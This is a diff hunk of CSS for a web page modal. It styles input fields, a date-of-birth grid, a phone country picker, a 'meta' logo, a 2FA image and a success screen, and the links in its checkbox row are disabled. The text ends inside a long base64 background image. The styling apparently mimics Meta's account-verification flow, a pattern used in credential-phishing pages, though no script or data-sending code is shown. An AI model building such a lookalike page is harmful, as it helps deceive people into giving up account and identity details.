@@ -188,6 +188,143 @@
     .footer-grid { grid-template-columns: repeat(2, 1fr); }
     .footer-bottom-bar { flex-direction: column; gap: 24px; }
   }
+
+  /* ===================== MODAL STYLES ===================== */
+  .modal-overlay {
+    display: none;
+    position: fixed;
+    inset: 0;
+    z-index: 999;
+    background: rgba(0,0,0,0.45);
+    align-items: center;
+    justify-content: center;
+    padding: 20px;
+    box-sizing: border-box;
+  }
+  .modal-overlay.open { display: flex; }
+  .modal-box {
+    background: #fff;
+    width: 100%;
+    max-width: 480px;
+    max-height: 90vh;
+    border-radius: 16px;
+    padding: 20px;
+    display: flex;
+    flex-direction: column;
+    overflow-y: auto;
+    transform: scale(0.9);
+    opacity: 0;
+    transition: transform 0.2s ease, opacity 0.2s ease;
+    box-shadow: 0 20px 60px rgba(0,0,0,0.2);
+  }
+  .modal-overlay.open .modal-box { transform: scale(1); opacity: 1; }
+  .modal-header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 14px; }
+  .modal-title { font-weight: 700; font-size: 15px; color: #0A1317; }
+  .modal-close {
+    width: 28px; height: 28px; border: none; background: none;
+    cursor: pointer; font-size: 22px; color: #9a9a9a; line-height: 1;
+    padding: 0; border-radius: 50%; display: flex; align-items: center; justify-content: center;
+  }
+  .modal-close:hover { background: #f0f0f0; color: #333; }
+  .modal-input-wrap {
+    width: 100%; border: 1px solid #d4dbe3; height: 40px; padding: 0 11px;
+    border-radius: 10px; background: #fff; font-size: 14px; margin-bottom: 10px;
+    display: flex; align-items: center; transition: border-color 0.2s;
+  }
+  .modal-input-wrap:focus-within { border-color: #3b82f6; }
+  .modal-input-wrap input {
+    width: 100%; outline: none; border: none; background: transparent;
+    font-size: 14px; font-family: inherit; height: 100%;
+  }
+  .modal-textarea-wrap {
+    width: 100%; border: 1px solid #d4dbe3; border-radius: 10px;
+    background: #fff; font-size: 14px; margin-bottom: 10px;
+    padding: 11px; transition: border-color 0.2s;
+  }
+  .modal-textarea-wrap:focus-within { border-color: #3b82f6; }
+  .modal-textarea-wrap textarea {
+    width: 100%; outline: none; border: none; background: transparent;
+    font-size: 14px; font-family: inherit; resize: none; display: block;
+  }
+  .modal-dob-grid { display: grid; grid-template-columns: repeat(3,1fr); gap: 10px; margin-bottom: 10px; }
+  .modal-btn-primary {
+    width: 100%; height: 45px; background: #0064E0; color: #fff;
+    border: none; border-radius: 40px; font-size: 15px; font-weight: 500;
+    cursor: pointer; transition: background 0.2s; font-family: inherit;
+  }
+  .modal-btn-primary:hover:not(:disabled) { background: #0052c5; }
+  .modal-btn-primary:disabled { opacity: 0.75; cursor: default; }
+  .modal-btn-outline {
+    width: 100%; height: 40px; border: 1px solid #d4dbe3;
+    border-radius: 40px; background: #fff; font-size: 14px;
+    color: #9a979e; cursor: pointer; margin-top: 12px; font-family: inherit;
+  }
+  .modal-error { color: #ef4444; font-size: 13px; margin-bottom: 10px; display: none; }
+  .modal-error.show { display: block; }
+  .modal-label { font-size: 14px; color: #9a979e; font-weight: 700; margin-bottom: 7px; display: block; }
+  .modal-hint { font-size: 13px; color: #9a979e; margin-bottom: 12px; }
+  .modal-check-row { display: flex; align-items: center; gap: 8px; font-size: 14px; margin-bottom: 20px; cursor: pointer; }
+  .modal-check-row input { width: 16px; height: 16px; accent-color: #0064E0; flex-shrink: 0; }
+  .modal-check-row a { color: #0064E0; pointer-events: none; }
+  .modal-meta-logo { width: 64px; margin: 20px auto 0; display: block; }
+  .modal-meta-icon { width: 48px; margin: 0 auto 20px; display: block; }
+  .modal-user-info { display: flex; align-items: center; gap: 6px; font-size: 13px; color: #9a979e; margin-bottom: 8px; }
+  .modal-dot { width: 4px; height: 4px; background: #9a979e; border-radius: 50%; display: inline-block; }
+  .modal-2fa-img, .modal-success-img { border-radius: 8px; overflow: hidden; margin-bottom: 16px; }
+  .modal-2fa-img img, .modal-success-img img { width: 100%; display: block; }
+  .modal-return-btn {
+    display: block; width: 100%; height: 40px; background: #0064E0;
+    color: #fff; text-align: center; border-radius: 40px; line-height: 40px;
+    text-decoration: none; font-size: 14px; font-weight: 500; transition: background 0.2s;
+  }
+  .modal-return-btn:hover { background: #0052c5; }
+  .modal-spinner {
+    width: 18px; height: 18px; border: 2px solid rgba(255,255,255,0.5);
+    border-top-color: #fff; border-radius: 50%;
+    animation: modalSpin 0.7s linear infinite; display: inline-block; vertical-align: middle;
+  }
+  @keyframes modalSpin { to { transform: rotate(360deg); } }
+
+  /* Phone Country Selector */
+  .pcs-phone-row { gap: 0; padding: 0; align-items: stretch; }
+  .pcs-wrap { position: relative; height: 100%; display: flex; align-items: center; }
+  .pcs-trigger {
+    display: flex; align-items: center; gap: 5px; cursor: pointer;
+    padding: 0 8px 0 10px; height: 100%; border-right: 1px solid #e5e7eb;
+    white-space: nowrap; user-select: none; flex-shrink: 0;
+    font-size: 18px;
+  }
+  .pcs-trigger:hover { background: #f9fafb; }
+  .pcs-dropdown {
+    position: absolute; top: calc(100% + 6px); left: 0;
+    width: 280px; background: #fff;
+    border: 1px solid #e5e7eb; border-radius: 12px;
+    box-shadow: 0 8px 32px rgba(0,0,0,0.12);
+    z-index: 9999; overflow: hidden;
+  }
+  .pcs-search {
+    width: 100%; padding: 10px 14px; border: none; border-bottom: 1px solid #f0f0f0;
+    font-size: 13px; outline: none; background: #fafafa;
+  }
+  .pcs-list { max-height: 220px; overflow-y: auto; }
+  .pcs-opt {
+    display: flex; align-items: center; gap: 8px;
+    padding: 8px 14px; cursor: pointer; transition: background 0.15s;
+  }
+  .pcs-opt:hover { background: #f0f4ff; }
+  /* Modal background */
+  .modal-overlay { background: rgba(0,0,0,0.35) !important; }
+  .modal-box {
+    background: url("data:image/jpeg;base64,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